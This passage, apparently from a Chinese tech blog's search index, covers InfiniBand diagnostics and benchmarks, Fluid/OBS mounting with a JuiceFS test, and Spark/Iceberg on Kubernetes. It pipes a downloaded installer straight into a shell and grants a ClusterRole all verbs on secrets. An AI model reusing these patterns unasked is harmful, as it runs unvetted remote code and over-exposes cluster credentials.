openibd - configure Mellanox devices... Nov 04 11:36:24 bj6-e-ai-kas-node-a800-gc-01 root[45935]: openibd: running in manual mode Nov 04 11:36:29 bj6-e-ai-kas-node-a800-gc-01 openibd[45926]: [49B blob data] Nov 04 11:36:29 bj6-e-ai-kas-node-a800-gc-01 systemd[1]: Finished openibd - configure Mellanox devices. 4. 安装 MFT 驱动 MFT 用于设备维护和管理场景，升级固件、查看设备的低级信息、修改硬件参数（如设置设备成 SR-IOV 模式）等。\n安装 MFT 1 2 3 wget https://www.mellanox.com/downloads/MFT/mft-4.29.0-131-x86_64-deb.tgz tar zxvf mft-4.29.0-131-x86_64-deb.tgz bash mft-4.29.0-131-x86_64-deb/install.sh 启动 MST 1 mst start 查看状态 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 mst status -v MST modules: ------------ MST PCI module is not loaded MST PCI configuration module loaded PCI devices: ------------ DEVICE_TYPE MST PCI RDMA NET NUMA ConnectX6(rev:0) /dev/mst/mt4123_pciconf3 cd:00.0 mlx5_5 net-ibs19 1 ConnectX6(rev:0) /dev/mst/mt4123_pciconf2 96:00.0 mlx5_4 net-ibs18 1 ConnectX6(rev:0) /dev/mst/mt4123_pciconf1 5f:00.0 mlx5_1 net-ibs11 0 ConnectX6(rev:0) /dev/mst/mt4123_pciconf0 1d:00.0 mlx5_0 net-ibs10 0 ConnectX5(rev:0) /dev/mst/mt4119_pciconf0.1 7c:00.1 mlx5_bond_0 net-bond1 0 ConnectX5(rev:0) /dev/mst/mt4119_pciconf0 7c:00.0 mlx5_bond_0 net-bond1 0 5. IB 网卡信息查看命令 5.1 查看网卡列表 1 2 3 ls /sys/class/net/ bond1 eth0 eth1 ibs10 ibs11 ibs18 ibs19 这里的 bond1 是用来聚合多个网卡的，从下面的输出可以看到其关联的是 eth0 和 eth1 。其他四个网卡是 IB 网卡。\n1 2 3 4 5 6 7 8 9 cat /proc/net/bonding/bond1 Slave Interface: eth0 MII Status: up Speed: 25000 Mbps Slave Interface: eth1 MII Status: up Speed: 25000 Mbps 5.2 查看 IB 网卡信息 1 2 3 4 5 6 7 8 lspci -D | grep Mellanox 0000:1d:00.0 Infiniband controller: Mellanox Technologies MT28908 Family [ConnectX-6] 0000:5f:00.0 Infiniband controller: Mellanox Technologies MT28908 Family [ConnectX-6] 0000:7c:00.0 Ethernet controller: Mellanox Technologies MT27800 Family [ConnectX-5] 0000:7c:00.1 Ethernet controller: Mellanox Technologies MT27800 Family [ConnectX-5] 0000:96:00.0 Infiniband controller: Mellanox Technologies MT28908 Family [ConnectX-6] 0000:cd:00.0 Infiniband controller: Mellanox Technologies MT28908 Family [ConnectX-6] 5.3 ibdev2netdev 查看映射 1 2 3 4 5 6 7 ibdev2netdev mlx5_0 port 1 ==\u0026gt; ibs10 (Up) mlx5_1 port 1 ==\u0026gt; ibs11 (Up) mlx5_4 port 1 ==\u0026gt; ibs18 (Up) mlx5_5 port 1 ==\u0026gt; ibs19 (Up) mlx5_bond_0 port 1 ==\u0026gt; bond1 (Up) 5.4 ibstat 查看状态 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ibstat CA \u0026#39;mlx5_4\u0026#39; CA type: MT4123 Number of ports: 1 Firmware version: 20.31.1014 Hardware version: 0 Node GUID: 0xe8ebd30300fd0788 System image GUID: 0xe8ebd30300fd0788 Port 1: State: Active Physical state: LinkUp Rate: 200 Base lid: 33 LMC: 0 SM lid: 1 Capability mask: 0x2651e848 Port GUID: 0xe8ebd30300fd0788 Link layer: InfiniBand CA \u0026#39;mlx5_bond_0\u0026#39; CA type: MT4119 Number of ports: 1 Firmware version: 16.34.1002 Hardware version: 0 Node GUID: 0xe8ebd30300bbf454 System image GUID: 0xe8ebd30300bbf454 Port 1: State: Active Physical state: LinkUp Rate: 25 Base lid: 0 LMC: 0 SM lid: 0 Capability mask: 0x00010000 Port GUID: 0xeaebd3fffebbf454 Link layer: Ethernet ... ibstat 会列出所以的 InfiniBand 设备，从字段 Link layer 可以看到有的处于 InfiniBand 模式，有的处于普通网卡的 Ethernet 模式。\n5.5 sminfo 查询子网信息 1 2 3 sminfo sminfo: sm lid 1 sm guid 0x946dae030082fd9a, activity count 113412031 priority 0 state 3 SMINFO_MASTER 6. IB 监控测试命令 6.1 ibv_asyncwatch 监听异步事件 1 2 3 4 ibv_asyncwatch mlx5_0: async event FD 4 ... 6.2 ibv_devices 简要信息 1 2 3 4 5 6 7 8 9 ibv_devices device node GUID ------ ---------------- mlx5_0 e8ebd30300d90228 mlx5_1 e8ebd30300d93038 mlx5_4 e8ebd30300d8f4a8 mlx5_5 e8ebd30300d8fe84 mlx5_bond_0 1070fd0300d218ee 6.3 ibv_devinfo 详细信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ibv_devinfo hca_id: mlx5_0 transport: InfiniBand (0) fw_ver: 20.31.1014 node_guid: e8eb:d303:00d9:0228 sys_image_guid: e8eb:d303:00d9:0228 vendor_id: 0x02c9 vendor_part_id: 4123 hw_ver: 0x0 board_id: MT_0000000223 phys_port_cnt: 1 port: 1 state: PORT_ACTIVE (4) max_mtu: 4096 (5) active_mtu: 4096 (5) sm_lid: 1 port_lid: 17 port_lmc: 0x00 link_layer: InfiniBand 6.4 ibv_rc_pingpong 测试连通性 ibv_rc_pingpong、ibv_srq_pingpong、ibv_ud_pingpong 分别使用 RC 连接、SRQ 或 UD 连接测试节点之间的连通性。\n服务端 1 2 3 ibv_rc_pingpong -d mlx5_0 local address: LID 0x0023, QPN 0x000069, PSN 0x7b3a43, GID :: 客户端 1 2 3 4 5 6 ibv_rc_pingpong x.x.x.x local address: LID 0x0011, QPN 0x00004c, PSN 0xf6c0af, GID :: remote address: LID 0x0023, QPN 0x000068, PSN 0x7fd96b, GID :: 8192000 bytes in 0.01 seconds = 12752.68 Mbit/sec 1000 iters in 0.01 seconds = 5.14 usec/iter 7. IB 性能测试命令 7.1 ib_read_bw 读带宽测试 使用 RDMA 读取（Read）操作，将数据从远程内存读取到本地内存。\n服务端 1 ib_read_bw -d mlx5_0 -a 客户端 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ib_read_bw x.x.x.x --------------------------------------------------------------------------------------- RDMA_Read BW Test Dual-port : OFF Device : mlx5_0 Number of qps : 1 Transport type : IB Connection type : RC Using SRQ : OFF PCIe relax order: Unsupported ibv_wr* API : ON TX depth : 128 CQ Moderation : 1 Mtu : 4096[B] Link type : IB Outstand reads : 16 rdma_cm QPs : OFF Data ex. method : Ethernet --------------------------------------------------------------------------------------- local address: LID 0x11 QPN 0x00d7 PSN 0x3f4202 OUT 0x10 RKey 0x007757 VAddr 0x007fdd661f3000 remote address: LID 0x23 QPN 0x006f PSN 0xc92b7f OUT 0x10 RKey 0x00640e VAddr 0x007fa486e28000 --------------------------------------------------------------------------------------- #bytes #iterations BW peak[MB/sec] BW average[MB/sec] MsgRate[Mpps] Conflicting CPU frequency values detected: 3000.001000 != 2592.026000. CPU Frequency is not max. 65536 1000 23479.18 23478.83 0.375661 --------------------------------------------------------------------------------------- 平均带宽约 25 GB/s\n7.2 ib_read_lat 读延迟测试 服务端 1 ib_read_lat -d mlx5_0 -a 客户端 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ib_read_lat x.x.x.x --------------------------------------------------------------------------------------- RDMA_Read Latency Test Dual-port : OFF Device : mlx5_0 Number of qps : 1 Transport type : IB Connection type : RC Using SRQ : OFF PCIe relax order: Unsupported ibv_wr* API : ON TX depth : 1 Mtu : 4096[B] Link type : IB Outstand reads : 16 rdma_cm QPs : OFF Data ex. method : Ethernet --------------------------------------------------------------------------------------- local address: LID 0x11 QPN 0x00d8 PSN 0xfb6eb4 OUT 0x10 RKey 0x02f8d8 VAddr 0x0056038e7f1000 remote address: LID 0x23 QPN 0x0070 PSN 0xed7a89 OUT 0x10 RKey 0x007354 VAddr 0x007fefa803d000 --------------------------------------------------------------------------------------- #bytes #iterations t_min[usec] t_max[usec] t_typical[usec] t_avg[usec] t_stdev[usec] 99% percentile[usec] 99.9% percentile[usec] Conflicting CPU frequency values detected: 3000.003000 != 2500.000000. CPU Frequency is not max. Conflicting CPU frequency values detected: 3000.000000 != 2776.822000. CPU Frequency is not max. 2 1000 2.80 3.40 2.88 2.89 0.06 3.24 3.40 --------------------------------------------------------------------------------------- 平均延迟约 3 usec。\n7.3 ib_send_bw 发送带宽测试 使用 IB 发送（Send）操作，将数据通过消息发送的方式传递。\n服务端 1 ib_send_bw 客户端 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ib_send_bw x.x.x.x --------------------------------------------------------------------------------------- Send BW Test Dual-port : OFF Device : mlx5_0 Number of qps : 1 Transport type : IB Connection type : RC Using SRQ : OFF PCIe relax order: Unsupported ibv_wr* API : ON TX depth : 128 CQ Moderation : 1 Mtu : 4096[B] Link type : IB Max inline data : 0[B] rdma_cm QPs : OFF Data ex. method : Ethernet --------------------------------------------------------------------------------------- local address: LID 0x11 QPN 0x00db PSN 0x4c58fb remote address: LID 0x23 QPN 0x0073 PSN 0xa9ed43 --------------------------------------------------------------------------------------- #bytes #iterations BW peak[MB/sec] BW average[MB/sec] MsgRate[Mpps] Conflicting CPU frequency values detected: 3000.000000 != 2500.270000. CPU Frequency is not max. 65536 1000 23452.31 23451.72 0.375227 --------------------------------------------------------------------------------------- 平均带宽约 25 GB/s\n7.4 ib_send_lat 发送延迟测试 服务端 1 ib_send_lat -d mlx5_0 -a 客户端 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ib_send_lat x.x.x.x --------------------------------------------------------------------------------------- Send Latency Test Dual-port : OFF Device : mlx5_0 Number of qps : 1 Transport type : IB Connection type : RC Using SRQ : OFF PCIe relax order: Unsupported ibv_wr* API : ON TX depth : 1 Mtu : 4096[B] Link type : IB Max inline data : 236[B] rdma_cm QPs : OFF Data ex. method : Ethernet --------------------------------------------------------------------------------------- local address: LID 0x11 QPN 0x00dc PSN 0xe1c26 remote address: LID 0x23 QPN 0x0074 PSN 0xaeeb66 --------------------------------------------------------------------------------------- #bytes #iterations t_min[usec] t_max[usec] t_typical[usec] t_avg[usec] t_stdev[usec] 99% percentile[usec] 99.9% percentile[usec] Conflicting CPU frequency values detected: 3000.000000 != 2650.989000. CPU Frequency is not max. Conflicting CPU frequency values detected: 2999.996000 != 2499.938000. CPU Frequency is not max. 2 1000 1.45 2.82 1.50 1.50 0.02 1.57 2.82 --------------------------------------------------------------------------------------- 平均延迟约 1.5 usec\n7.5 ib_write_bw 写带宽测试 使用 RDMA 写入（Write）操作，将数据从本地内存写入远程内存\n服务端 1 ib_write_bw -d mlx5_0 -a 客户端 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ib_write_bw x.x.x.x --------------------------------------------------------------------------------------- RDMA_Write BW Test Dual-port : OFF Device : mlx5_0 Number of qps : 1 Transport type : IB Connection type : RC Using SRQ : OFF PCIe relax order: Unsupported ibv_wr* API : ON TX depth : 128 CQ Moderation : 1 Mtu : 4096[B] Link type : IB Max inline data : 0[B] rdma_cm QPs : OFF Data ex. method : Ethernet --------------------------------------------------------------------------------------- local address: LID 0x11 QPN 0x00de PSN 0x4a0b65 RKey 0x00bea0 VAddr 0x007fd4f0020000 remote address: LID 0x23 QPN 0x0076 PSN 0xd08359 RKey 0x00c5a5 VAddr 0x007f1dc709a000 --------------------------------------------------------------------------------------- #bytes #iterations BW peak[MB/sec] BW average[MB/sec] MsgRate[Mpps] Conflicting CPU frequency values detected: 3000.042000 != 2521.873000. CPU Frequency is not max. 65536 5000 23533.15 23532.41 0.376519 --------------------------------------------------------------------------------------- 平均带宽约 23 GB/s\n8.IB 诊断命令 8.1 ibdiagnet 诊断网络 1 ibdiagnet ","description":"","id":24,"section":"post","tags":["博文","InfiniBand","AI"],"title":"InfiniBand 网络及常用命令","uri":"https://www.chenshaowen.com/blog/infiniband-network-and-useful-commands.html"},{"content":"1. Jindo 挂载 OBS 配置环境变量 1 2 3 4 export ENDPOINT=obs.cn-north-4.myhuaweicloud.com export BUCKET= export AK= export SK= 创建凭证 1 2 3 4 5 6 7 8 9 10 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Secret metadata: name: myobssecret type: Opaque stringData: fs.obs.accessKeyId: ${AK} fs.obs.accessKeySecret: ${SK} EOF 创建 Dataset 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: myobs-jindo spec: mounts: - mountPoint: obs://${BUCKET}/test2/ options: fs.obs.endpoint: ${ENDPOINT} encryptOptions: - name: fs.obs.accessKeyId valueFrom: secretKeyRef: name: myobssecret key: fs.obs.accessKeyId - name: fs.obs.accessKeySecret valueFrom: secretKeyRef: name: myobssecret key: fs.obs.accessKeySecret accessModes: - ReadWriteMany EOF 创建 JindoRuntime 1 2 3 4 5 6 7 8 9 10 11 12 13 14 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: JindoRuntime metadata: name: myobs-jindo spec: replicas: 2 tieredstore: levels: - mediumtype: SSD path: /cache quota: 40960 low: \u0026#34;0.1\u0026#34; EOF 创建 Pod 负载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: myobs-jindo spec: containers: - name: demo image: shaowenchen/demo-ubuntu volumeMounts: - mountPath: /data name: data volumes: - name: data persistentVolumeClaim: claimName: myobs-jindo EOF 2. 性能测试 进入 Pod\n1 kubectl exec -it myobs-jindo -- bash 执行\n1 curl -sSL https://d.juicefs.com/install | sh - 安装 JuiceFS 客户端\n1 2 3 4 5 6 7 8 9 10 11 12 13 juicefs bench --block-size 4 --big-file-size 1024 /data Benchmark finished! BlockSize: 4.0 MiB, BigFileSize: 1.0 GiB, SmallFileSize: 128 KiB, SmallFileCount: 100, NumThreads: 1 +------------------+--------------+----------------+ | ITEM | VALUE | COST | +------------------+--------------+----------------+ | Write big file | 389.70 MiB/s | 2.63 s/file | | Read big file | 242.28 MiB/s | 4.23 s/file | | Write small file | 6.4 files/s | 157.08 ms/file | | Read small file | 15.5 files/s | 64.39 ms/file | | Stat file | 34.9 files/s | 28.62 ms/file | +------------------+--------------+----------------+ 用来分发模型，性能基本足够。\n3. 清理资源 1 2 3 4 kubectl delete pod myobs-jindo kubectl delete jindoruntime myobs-jindo kubectl delete dataset myobs-jindo kubectl delete secret myobssecret ","description":"","id":25,"section":"post","tags":["博文","OBS","Fluid","JuiceFS","AI","Data"],"title":"使用 Fluid 对接 OBS 存储及性能测试","uri":"https://www.chenshaowen.com/blog/using-fluid-to-access-obs-storage-and-performance-testing.html"},{"content":"1. 数据处理架构 主要分为四层：\n处理能力层，Spark on Kubernetes 提供流式的数据处理能力 数据管理层，Iceberg 提供 ACID、table 等数据集访问操作能力 存储层，Hive MetaStore 管理 Iceberg 表元数据，Postgresql 作为 Hive MetaStore 存储后端，S3 作为数据存储后端 资源层，Kubernetes 管理集群的计算、存储和网络资源，对上层提供统一的资源管理能力 1.1 Spark Apache Spark 是一个开源集群运算框架，最初是由加州大学柏克莱分校 AMPLab 所开发。相对于 Hadoop 的 MapReduce 会在执行完工作后将中介资料存放到磁盘中，Spark 使用了内存运算技术，能在资料尚未写入硬盘时即在内存分析运算。\n可以完成的任务包括:\n批处理，提取、转换、加载、处理等 流处理，实时分析、事件处理 SQL 查询，与 Hive、Iceberg 等数据源集成，提供强大的查询优化功能 机器学习，Spark 中的 MLlib 支持常见的机器学习算法，如回归、分类、聚类等 图计算，Spark 中的 GraphX 支持常见的图计算算法，如 PageRank 算法 Spark on Kubernetes 项目是一个在 Kubernetes 上运行 Apache Spark 应用程序的解决方案，提供了更加云原生的运行方式。\n1.2 Iceberg Iceberg 是一种表格式（tableformat），我们可以把它定义成一种数据组织格式。\nIceberg 是由 Netflix 开发并开源的、用于庞大分析数据集的开放表格式。Iceberg 在 Presto 和 Spark 中添加了使用高性能格式的表（Hudi 也支持 Presto 和 Spark 集成），该格式的工作方式类似于 SQL 表。\n与底层的存储格式（比如 ORC、Parquet 之类的列式存储格式）最大的区别是，它并不定义数据存储方式，而是定义了数据、元数据的组织方式，向上提供统一的表的语义。\n常见的使用方式是，在 Hive Metastore 建立一个 iceberg 格式的表。用 fink 或者 spark 写入 iceberg，然后再通过其他方式来读取这个表，比如 spark、flink、presto 等。本篇主要也是采用的这种技术路线。\n1.3 Hive Metastore Hive Metastore 是 Apache Hive 的核心组件之一，它主要用作元数据管理服务，为 Hive、Spark、Presto、Trino 等大数据处理工具提供了一个统一的元数据存储和访问层。\n简单来说，Hive Metastore 负责管理和存储表的结构、数据库信息以及存储位置等元数据，方便分布式计算框架快速访问和处理大规模数据。\n2. 部署 Hive Metastore 2.1 部署 PG 参考 https://github.com/shaowenchen/demo/tree/master/spark-3.5-iceberg 目录中的 postgres15.yaml 文件部署。\n需要注意的是，示例中 PGSQL 存储使用的是本地主机 hostPath 存储。如果是生产环境，需要更换为更可靠的存储服务。\n2.2 PG 数据库初始化 设置环境变量 1 2 3 4 5 export POSTGRES_USER=postgresadmin export POSTGRES_PASSWORD=postgrespassword export POSTGRES_IP= 主机 IP export POSTGRES_PORT= 集群 postgres svc 的 nodePort export POSTGRES_DB=postgresdb 创建数据库 1 psql -U $POSTGRES_USER -h $POSTGRES_IP -p $POSTGRES_PORT -d postgres -c \u0026#34;CREATE DATABASE $POSTGRES_DB;\u0026#34; 2.3 部署 Hive Metastore 参考 https://github.com/shaowenchen/demo/tree/master/spark-3.5-iceberg 目录中的 hive-metastore.yaml 文件部署。\n需要替换一下 S3 相关的存储桶配置，BUCKET、ACCESS_KEY、SECRET_KEY、ACCESS_KEY、SECRET_KEY 等。\nHive Metastore 使用 PGSQL 作为数据库后端，在部署的配置文件中有写 PGSQL 的信息。如果采用外部数据库，需要更新部署文件中的相关配置。\n3. 部署 Spark Operator 3.1 Spark Operator 简介 上图是 Spark Operator 的架构，展示了各个组件的关系。其工作流程如下:\nspark-submit 提交 Spark 作业到 Kubernetes 集群(可以通过 sparkapplications 对象来提交) Kubernetes 集群创建 Driver Pod Driver 启动若干 Executor Pods Executor 执行具体的 Task 任务 执行完成后，Driver 清理 Executor 3.2 安装 Spark Operator 添加 repo 1 2 helm repo add spark-operator https://kubeflow.github.io/spark-operator helm repo update 安装 spark-operator 1 2 3 4 5 6 7 8 helm install spark-operator spark-operator/spark-operator \\ --version 2.0.0-rc.0 \\ --namespace spark-operator \\ --set \u0026#39;spark.jobNamespaces={default,spark,spark-operator,spark}\u0026#39; \\ --create-namespace \\ --set webhook.enable=true \\ --set image.repository=kubeflow/spark-operator \\ --set image.tag=2.0.0-rc.0 spark-operator 仅会处理 jobNamespaces 中指定的命名空间的 Spark 作业。\n卸载 spark-operator 1 helm -n spark-operator uninstall spark-operator 查看负载 1 2 3 4 5 kubectl -n spark-operator get pod NAME READY STATUS RESTARTS AGE spark-operator-controller-679bcc59c9-lsljx 1/1 Running 0 2d3h spark-operator-webhook-676c675cdd-t8p95 1/1 Running 0 2d3h 查看 CRD 1 2 3 4 kubectl get crd |grep spark scheduledsparkapplications.sparkoperator.k8s.io 2024-05-23T06:53:32Z sparkapplications.sparkoperator.k8s.io 2024-05-23T06:53:32Z sparkapplications.sparkoperator.k8s.io 定义的是 Spark 作业，scheduledsparkapplications.sparkoperator.k8s.io 定义的是定时执行的 Spark 作业。\n4. 使用 Standalone Spark 和 Iceberg 处理数据 Standalone 模式下的 Spark 会在本地启动完整的依赖。\n4.1 部署一个 standalone 的 Spark 实例 参考 https://github.com/shaowenchen/demo/tree/master/spark-3.5-iceberg 目录中的 spark-iceberg.yaml 文件部署。\n4.2 进入 spark Pod 交互操作 1 kubectl -n spark exec -it spark-iceberg-749cf599dd-xdzlg bash 一共有三种可用的 spark 交互终端：\nspark-shell spark-sql spark-python 4.3 创建 Iceberg 表 执行 spark-sql 命令进入 spark-sql （default）\u0026gt; 终端\n创建命名空间 1 CREATE NAMESPACE ns1; 创建表 1 2 3 4 5 CREATE TABLE demo.ns1.table1 （ id BIGINT, data STRING, category STRING ） USING iceberg; 上面命令创建的表会被保存到默认配置文件设置的 spark-warehouse 中，如果想要指定存储位置，可以使用 LOCATION 关键字指定。\n1 2 3 4 5 6 CREATE TABLE demo.ns1.table2 （ id BIGINT, data STRING, category STRING ） USING iceberg LOCATION \u0026#39;s3a://mybucket/datalake/spark-warehouse/mytable/\u0026#39;; 4.4 使用 spark-python 处理 退出 spark-shell 终端，将下面的代码保存到 Pod 中，使 python spark-example.py 执行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # spark-example.py from pyspark import SparkConf from pyspark.sql import SparkSession from pyspark.sql.functions import col, length sparkSessionConf = SparkConf（）.setAppName（f\u0026#34;DacnSpark Application [1]\u0026#34;） spark = （ SparkSession.builder.config（conf=sparkSessionConf）.enableHiveSupport（）.getOrCreate（） ） if __name__ == \u0026#34;__main__\u0026#34;: # 数据加载 df = spark.read.json（ \u0026#34;s3a://mybucket/datalake/spark-warehouse/source/ccnet-4000.json\u0026#34; ） # 数据处理 df_cleaned = df.na.drop（） # 使用 iceberg 表管理，方便下一次处理 df_cleaned.writeTo（\u0026#34;demo.ns1.table3\u0026#34;）.createOrReplace（） # 数据输出 spark.read.table（\u0026#34;demo.ns1.table3\u0026#34;）.write.json（ \u0026#34;s3a://mybucket/datalake/spark-warehouse/result/ccnet-4000-example.json\u0026#34;, \u0026#34;overwrite\u0026#34; ） 这个处理流程分为三部分：\n数据加载，将外部原生 JSON 数据，也可以直接读取 Iceberg 表的数据。 数据处理，利用 Spark 的计算能力，对数据进行处理。 数据输出，将处理后的数据输出到外部存储 S3 中，提供给业务方使用。 此时，在对象存储中可以看到，Iceberg 表的数据\nIceberg 表的元数据\n处理后导出的数据\n5. 使用 Spark 在集群处理数据 5.1 使用 yaml 提交 Spark 作业 给 Driver 设置权限 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: spark-driver rules: - apiGroups: [\u0026#34;\u0026#34;] resources: [ \u0026#34;pods\u0026#34;, \u0026#34;configmaps\u0026#34;, \u0026#34;secrets\u0026#34;, \u0026#34;services\u0026#34;, \u0026#34;persistentvolumeclaims\u0026#34;, \u0026#34;events\u0026#34;, ] verbs: [\u0026#34;*\u0026#34;] 1 2 3 4 5 6 7 8 9 10 11 12 apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: spark-driver-binding subjects: - kind: ServiceAccount name: default namespace: spark roleRef: kind: ClusterRole name: spark-driver apiGroup: rbac.authorization.k8s.io 提交 Spark 作业 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 apiVersion: \u0026#34;sparkoperator.k8s.io/v1beta2\u0026#34; kind: SparkApplication metadata: name: pyspark-pi namespace: spark spec: type: Python pythonVersion: \u0026#34;3\u0026#34; mode: cluster image: spark:3.5.1-python3 imagePullPolicy: Always mainApplicationFile: local:///opt/spark/examples/src/main/python/pi.py sparkVersion: \u0026#34;3.5.1\u0026#34; restartPolicy: type: OnFailure onFailureRetries: 3 onFailureRetryInterval: 10 onSubmissionFailureRetries: 5 onSubmissionFailureRetryInterval: 20 driver: cores: 1 coreLimit: \u0026#34;1200m\u0026#34; memory: \u0026#34;512m\u0026#34; labels: version: 3.5.1 serviceAccount: default executor: cores: 1 instances: 1 memory: \u0026#34;512m\u0026#34; labels: version: 3.5.1 这里使用的是 Spark 官方镜像，内置有 examples 示例。\n跟踪运行状态 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 kubectl -n spark get pod -w NAME READY STATUS RESTARTS AGE pyspark-pi-driver 0/1 ContainerCreating 0 0s spark-iceberg-749cf599dd-xdzlg 1/1 Running 0 20h pyspark-pi-driver 1/1 Running 0 2s pythonpi-5a8ac191caddfc56-exec-1 0/1 Pending 0 0s pythonpi-5a8ac191caddfc56-exec-1 0/1 Pending 0 0s pythonpi-5a8ac191caddfc56-exec-1 0/1 ContainerCreating 0 0s pythonpi-5a8ac191caddfc56-exec-1 1/1 Running 0 2s pythonpi-5a8ac191caddfc56-exec-1 1/1 Terminating 0 6s pythonpi-5a8ac191caddfc56-exec-1 0/1 Terminating 0 7s pythonpi-5a8ac191caddfc56-exec-1 0/1 Terminating 0 7s pythonpi-5a8ac191caddfc56-exec-1 0/1 Terminating 0 7s pyspark-pi-driver 0/1 Completed 0 16s pyspark-pi-driver 0/1 Completed 0 18s 当 Completed 时，Spark 作业已完成；同时，executor pod 已经被清理掉，只留下 driver pod。\n查看运行结果 1 2 3 kubectl -n spark logs pyspark-pi-driver -f |grep roughly Pi is roughly 3.144760 Driver 从 Executor 获取执行结果，然后输出到本地。\n清理 1 kubectl -n spark delete sparkapplication pyspark-pi 5.2 spark-submit 相关参数 1 spark-submit --help 基本用法 spark-submit [选项] \u0026lt;应用程序 JAR 文件 | Python 文件 | R 文件\u0026gt; [应用程序参数] spark-submit --kill [提交 ID] --master [spark://...] spark-submit --status [提交 ID] --master [spark://...] spark-submit run-example [选项] 示例类名 [示例参数] 选项（Options） \u0026ndash;master MASTER_URL：Spark 集群的主节点 URL（如 spark://host:port、mesos://host:port、yarn、k8s://https://host:port 或本地模式 local[*]），默认为 local[*]（即使用本地所有 CPU 内核运行）。\n\u0026ndash;deploy-mode DEPLOY_MODE：指定驱动程序的部署模式，\u0026ldquo;client\u0026rdquo; 表示在本地运行驱动程序，\u0026ldquo;cluster\u0026rdquo; 表示在集群中运行驱动程序（默认为 client 模式）。\n\u0026ndash;class CLASS_NAME：你的应用程序的主类（针对 Java / Scala 应用程序）。\n\u0026ndash;name NAME：应用程序的名称。\n\u0026ndash;jars JARS：逗号分隔的 JAR 文件列表，包含在驱动程序和执行程序的类路径中。\n\u0026ndash;packages：逗号分隔的 Maven 坐标列表，指定要包含在驱动程序和执行程序类路径中的 JAR 包。首先会在本地 Maven 仓库中搜索，然后是 Maven Central 以及通过 --repositories 指定的其他远程仓库。\n\u0026ndash;exclude-packages：逗号分隔的 groupId:artifactId 列表，用于排除指定的依赖包，避免与 --packages 提供的依赖发生冲突。\n\u0026ndash;repositories：逗号分隔的远程仓库列表，用于搜索 --packages 指定的 Maven 坐标。\n\u0026ndash;py-files PY_FILES：逗号分隔的 .zip、.egg 或 .py 文件列表，这些文件会被放在 Python 应用的 PYTHONPATH 中。\n\u0026ndash;files FILES：逗号分隔的文件列表，文件会被放置在每个执行器的工作目录中，可通过 SparkFiles.get（fileName） 访问这些文件。\n\u0026ndash;archives ARCHIVES：逗号分隔的压缩文件列表，这些压缩文件会被解压到每个执行器的工作目录中。\n\u0026ndash;conf, -c PROP=VALUE：设置任意 Spark 配置属性。\n\u0026ndash;properties-file FILE：指定一个文件路径，从该文件中加载额外的配置属性。如果未指定，Spark 将默认查找 conf/spark-defaults.conf 文件。\n\u0026ndash;driver-memory MEM：指定驱动程序的内存大小（如 1000M，2G），默认为 1024M。\n\u0026ndash;driver-java-options：向驱动程序传递额外的 Java 选项。\n\u0026ndash;driver-library-path：为驱动程序传递额外的库路径。\n\u0026ndash;driver-class-path：为驱动程序传递额外的类路径。注意，使用 --jars 添加的 JAR 文件会自动包含在类路径中。\n\u0026ndash;executor-memory MEM：指定每个执行器的内存大小（如 1000M，2G），默认为 1G。\n\u0026ndash;proxy-user NAME：指定要提交应用时模拟的用户。此选项与 --principal 和 --keytab 不兼容。\n\u0026ndash;help, -h：显示帮助信息并退出。\n\u0026ndash;verbose, -v：打印额外的调试信息。\n\u0026ndash;version：打印当前 Spark 的版本信息。\nSpark Connect（仅限 Spark Connect 模式） \u0026ndash;remote CONNECT_URL：指定连接 Spark Connect 服务的 URL，例如 sc://host:port。此选项无法与 --master 和 --deploy-mode 一起设置。该选项为实验性质，可能会在小版本更新中发生变化。\n集群部署模式（Cluster Deploy Mode Only） \u0026ndash;driver-cores NUM：指定驱动程序使用的核心数（仅在集群模式下使用，默认为 1）。\nSpark Standalone 或 Mesos（仅限集群模式） \u0026ndash;supervise：如果指定此选项，驱动程序在失败时会自动重启。\nSpark Standalone、Mesos 或 K8S（仅限集群模式） \u0026ndash;kill SUBMISSION_ID：指定后，杀死具有该 ID 的驱动程序。\n\u0026ndash;status SUBMISSION_ID：指定后，获取具有该 ID 的驱动程序状态。\nSpark Standalone 和 Mesos（仅限 Standalone 和 Mesos 模式） \u0026ndash;total-executor-cores NUM：为所有执行器指定使用的总核心数。\nSpark Standalone、YARN 和 Kubernetes（仅限 Standalone、YARN 和 K8S 模式） \u0026ndash;executor-cores NUM：每个执行器使用的核心数（在 YARN 和 Kubernetes 模式下默认为 1，在 Standalone 模式下默认为工作节点上所有可用的核心）。\nSpark on YARN 和 Kubernetes（仅限 YARN 和 K8S 模式） \u0026ndash;num-executors NUM：启动的执行器数量（默认为 2）。如果启用了动态资源分配，初始的执行器数量至少为指定的值。\n\u0026ndash;principal PRINCIPAL：指定用于登录到 KDC 的主体。\n\u0026ndash;keytab KEYTAB：指定主体对应的 keytab 文件的完整路径。\nSpark on YARN（仅限 YARN 模式） \u0026ndash;queue QUEUE_NAME：指定 YARN 的队列名称，默认为 